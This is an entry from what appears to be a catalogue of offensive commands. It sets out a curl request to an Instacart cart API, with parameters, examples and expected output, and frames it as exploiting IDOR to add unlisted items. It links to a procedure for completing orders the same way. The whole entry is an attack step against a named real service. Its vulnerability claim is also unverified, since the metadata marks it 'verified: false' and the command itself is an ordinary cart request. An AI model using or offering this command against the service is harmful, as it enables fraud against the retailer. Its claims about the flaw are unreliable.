---
id: cmd-curl-add-to-cart
data: >-
  curl -X POST -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type:
  application/json" -d '{"item_id": {ITEM_ID}, "quantity": 1}'
  https://api.instacart.com/v2/cart/add
tags:
  - api
  - exploitation
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.352Z'
verified: false
validated: true
submitted: true
---
# curl-add-to-cart

## Command

```bash
curl -X POST -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d '{"item_id": {ITEM_ID}, "quantity": 1}' https://api.instacart.com/v2/cart/add
```

## Description

This command adds an item to the Instacart shopping cart via API, exploiting IDOR by using unlisted item IDs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Auth header | Yes |
| `-H "Content-Type: application/json"` | JSON content type | Yes |
| `-d '{"item_id": {ITEM_ID}, "quantity": 1}'` | Payload with item ID and quantity | Yes |
| `https://api.instacart.com/v2/cart/add` | Cart addition endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Authorization: Bearer abc123" -H "Content-Type: application/json" -d '{"item_id": 12345, "quantity": 1}' https://api.instacart.com/v2/cart/add
```

### Advanced Usage

```bash
curl -X POST -v -H "Authorization: Bearer abc123" -H "Content-Type: application/json" -d '{"item_id": 99999, "quantity": 2}' https://api.instacart.com/v2/cart/add
```

## Expected Output

JSON response like {"success": true, "cart_updated": true} on addition; error if invalid.

## Related

- [[commands/curl-view-item]]
- [[procedures/Add-Unlisted-Items-to-Cart-and-Complete-Order-via-IDOR]]
